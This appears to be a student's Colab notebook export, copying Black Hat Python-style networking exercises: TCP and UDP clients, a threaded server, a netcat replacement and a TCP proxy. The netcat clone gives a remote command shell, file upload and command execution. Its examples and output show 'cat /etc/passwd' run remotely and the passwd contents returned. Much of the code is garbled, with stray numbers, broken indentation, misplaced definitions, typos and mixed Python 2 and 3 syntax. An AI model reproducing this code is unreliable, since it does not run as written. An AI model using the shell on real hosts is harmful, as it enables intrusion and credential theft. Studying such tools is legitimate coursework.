# -*- coding: utf-8 -*-
"""BlackHat.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1SOQDlI_76Flls6cYXokXjPeuBZOqKWFT

ABDIEL GABRIEL HAU TUN 200300588** TOPICOS SELECTOS PARA INGENIERIA.**

Primer Script **TCP Client**
"""

import socket

target_host = " www.google.com "
target_port = 80

# create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect the client
client.connect((target_host, target_port))

# send some data
client.send(b"GET / HTTP/1.1\r\nHost: google.com\r\n\r\n")

# receive some data
response = client.recv(4096)

print(response.decode())

client.close()

"""Segundo Script **UDP CLIENT**"""

import socket

target_host = "127.0.0.1"
target_port = 9997

# create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# send some data
client.sendto(b"AAABBBCCC", (target_host, target_port))

# receive some data
data, addr = client.recvfrom(4096)
print(data.decode())

client.close()

"""Tercer Script **TCP SERVER**"""

import socket
import threading

IP = "0.0.0.0"
PORT = 9998

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen(5)
    print(f' [*] Listening on {IP}: {PORT}')

    while True:
        client, address = server.accept()
        print(f' [*] Accepted connection from {address[0]}: {address[1]}')
        client_handler = threading.Thread(target=handle_client, args=(client,))
         client_handler.start():

            def handle_client(client_socket): 5
                with client_socket as sock:
                    request = sock.recv(1024)
                    print(f' [*] Received: (request.decode("utf-8") }')
                    sock.send(b'ACK')

if __name__ == "__main__":
    main()

"""Cuarto Script **Replacing NETCAT**"""

import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return 1

        output = subprocess.check_output(shlex.split(cmd),
                                          stderr=subprocess.STDOUT)
        return output.decode()

if __name__ == '__main__':
    parser = argparse.ArgumentParser( 1
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example: 2
            netcat.py -t 192.168.1.108 -p 5555 -l -c #
command shell
            netcat.py -t 192.168.1.108 -p 5555 -l -
u=mytest.txt # upload to file
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat
/etc/passwd\" # execute command
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135
# echo text to server port 135
            netcat.py -t 192.168.1.108 -p 5555 # connect to
server
        '''))

parser.add_argument('-c', '--command',
                    action='store_true', help='command shell')
parser.add_argument('-e', '--execute', help='execute specified command')
parser.add_argument('-l', '--listen',
                    action='store_true', help='listen')
parser.add_argument('-p', '--port', type=int,
                    default=5555, help='specified port')
parser.add_argument('-t', '--target',
                    default='192.168.1.203', help='specified IP')
parser.add_argument('-u', '--upload', help='upload file')

args = parser.parse_args()

if args.listen:
    buffer = sys.stdin.read()
    nc = NetCat(args, buffer.encode())
    nc.run()

class NetCat:
     def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
         self.socket = socket.socket(socket.AF_INET,
socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET,
socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
             self.listen()
        else:
             self.send()

def send(self):
     1    self.socket.connect((self.args.target,
self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

         try:
             while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                         break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                     self.socket.send(buffer.encode())
         except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

def listen(self):
         self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
         while True:
            client_socket, _ = self.socket.accept()
             client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

def handle(self, client_socket):
         if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

         elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break



            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

         elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

"""Quinto Scrip **Proxi**"""

import sys
import socket
import threading
def server_loop(local_host,local_port,remote_host,remote_port,receive_first):

	server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	try:
		server.bind((local_host,local_port))
	except:
				print "[!!] Failed to listen on $s:$d" % (local_host,local_port)
				print "[!!] Check for other listening sockets or correct permissions."
				sys.exit(0)
				print "[*] Listening on $s:$d" % (local_host,local_port)


				server.listen(5)

				while True:
					client_socket, addr = server.accept()

					# print out the local connection information
					print "[==>] Received incoming connection from %s:%d" % (addr[0],addr[1])

					# start a thread to talk to the remote host
					proxy_thread = threading.Thread(target=proxy_handler,args=(client_socket,remote_host,remote_port,receive_first))

					proxy_thread.start()

def main():

	# no fancy command-line parsing here
	if len(sys.argv[1:]) != 5:
		print "Usage: ./tcpproxy.py [localhost] [localport] [remotehost] [remoteport] [receive_first]"
		print "Example: ./tcpproxy.py 127.0.0.1 9000 10.12.132.1 9000 True"
		sys.exit(0)

	# setup local listening parameters
	local_host = sys.argv[1]
	local_port = int(sys.argv[2])

	# setup remote target
	remote_host = sys.argv[3]
	remote_port = int(sys.argv[4])

	# this tells our proxy to connect and receive data
	# before sending to the remote host
	receive_first = sys.argv[5]

	if "True" in receive_first:
		receive_first = True
	else:
		receive_first = False


	# now spin up our listening socket
	server_loop(local_host,local_port,remote_host,remote_port,receive_first)

main()

def proxy_handler(client_socket, remote_host, remote_port, receive_first):

	# connect to the remote host
	remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# receive data from the remote end if necessary
	if receive_first:

		remote_buffer = receive_from(remote_socket)
		hexdump(remote_buffer)

		# send it to our response handler
		remote_buffer = response_handler(remote_socket)

		# if we have data to send to our local client, send it
		if len(remote_buffer):
			print "[<==] Sending %d bytes to localhost." % len(remote_buffer)
			client_socket.send(remote_buffer)
	# now lets loop and read from local,
		# send to remote, send to local
	# rinse, wash, repeat
	while True:

		# read from local host
		local_buffer = receive_from(client_socket)


		if len(local_buffer):

			print "[==>] Received %d bytes from localhost." % len(local_buffer)
			hexdump(local_buffer)

			# send it to our request handler
			local_buffer = request_handler(local_buffer)

			# send off the data to the remote host
			remote_socket.send(local_buffer)
			print "[==>] Sent to remote."

			# receive back to response
			remote_buffer = receive_from(remote_socket)

			if len(remote_buffer):

				print "[<==] Received %d bytes from remote." % len(remote_buffer)
				hexdump(remote_buffer)

				# send to our response handler
				remote_buffer = response_handler(remote_buffer)

				# send the response to the local socket
				client_socket.send(remote_buffer)

				print "[<==] Sent to localhost."

			# if no more data on either side, close the connections
			if not len(local_buffer) or not len(remote_buffer):
				client_socket.close()
				remote_socket.close()
				print "[*] No more data. Closing connections."

				break

# this is a pretty hex dumping function directly taken from
# the comments here:
# http://code.activestate.com/recipes/142812-hex-dumper/
def hexdump(src, length=16):
	result = []
	digits = 4 if isinstance(src, unicode) else 2

	for i in xrange(0, len(src), length):
		s = sr[i:i+length]
		hexa = b' '.join(["%0*X" % (digits, ord(x)) for x in s])
		text = b''join([x if 0x20 <= ord(x) < 0x7F else b'.' for x in s])
		result.append( b"%04X   %-*s   %s" % (i, length*(digits + 1), hexa, text) )

	print b'\n'.join(result)

def receive_from(connection):

	buffer = ""

	# We set a 2 second timeout; depending on your
	# target, this may need to be adjusted
	connection.settimeout(2)

		try:
			# keep reading into the buffer until
			# there's no more data
			# or we time out
			while True:
				data = connection.recv(4096)

				if not data:
					break

				buffer += data

		except:
		pass

		return buffer

# modify any requests destined for the remote host
def request_handler(buffer):
	# perform packet modifications
	return buffer

# modify any response destined for the local host
def response_handler(buffer):
	# perform packet modifications
	return buffer

""" **Kicking the tires**"""

$ python netcat.py  --help
usage: netcat.py [-h] [-c] [-e EXECUTE] [-l] [-p PORT] [-t
TARGET] [-u UPLOAD]

BHP Net Tool

optional arguments:
  -h, --help            show this help message and exit
  -c, --command         initialize command shell
  -e EXECUTE, --execute EXECUTE
                        execute specified command
  -l, --listen          listen
  -p PORT, --port PORT  specified port
  -t TARGET, --target TARGET
                        specified IP
  -u UPLOAD, --upload UPLOAD
                        upload file

Example:
      netcat.py -t 192.168.1.108 -p 5555 -l -c # command
shell
      netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt #
upload to file
      netcat.py -t 192.168.1.108 -p 5555 -l -e="cat
/etc/passwd" # execute command
      echo 'ABCDEFGHI' | ./netcat.py -t 192.168.1.108 -p 135
          # echo local text to server port 135
      netcat.py -t 192.168.1.108 -p 5555 # connect to server

# Commented out IPython magic to ensure Python compatibility.
# % python netcat.py -t 192.168.1.203 -p 5555
CTRL-D
<BHP:#>  ls -la
total 23497
drwxr-xr-x 1 502 dialout      608 May 16 17:12 .
drwxr-xr-x 1 502 dialout      512 Mar 29 11:23 ..
-rw-r--r-- 1 502 dialout     8795 May  6 10:10 mytest.png
-rw-r--r-- 1 502 dialout    14610 May 11 09:06 mytest.sh
-rw-r--r-- 1 502 dialout     8795 May  6 10:10 mytest.txt
-rw-r--r-- 1 502 dialout     4408 May 11 08:55 netcat.py
<BHP: #> uname -a
Linux kali 5.3.0-kali3-amd64 #1 SMP Debian 5.3.15-1kali1
(2019-12-09) x86_64 GNU/Linux

# Commented out IPython magic to ensure Python compatibility.
# % python netcat.py -t 192.168.1.203 -p 5555

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin

# Commented out IPython magic to ensure Python compatibility.
# % nc 192.168.1.203 5555
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin

$ echo -ne "GET / HTTP/1.1\r\nHost: reachtim.com\r\n\r\n"
|python ./netcat.py -t reachtim.com -p 80

HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Mon, 18 May 2020 12:46:30 GMT
Content-Type: text/html; charset=iso-8859-1
Content-Length: 229
Connection: keep-alive
Location: https://reachtim.com/

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a
href="https://reachtim.com/">here</a>.</p>
</body></html>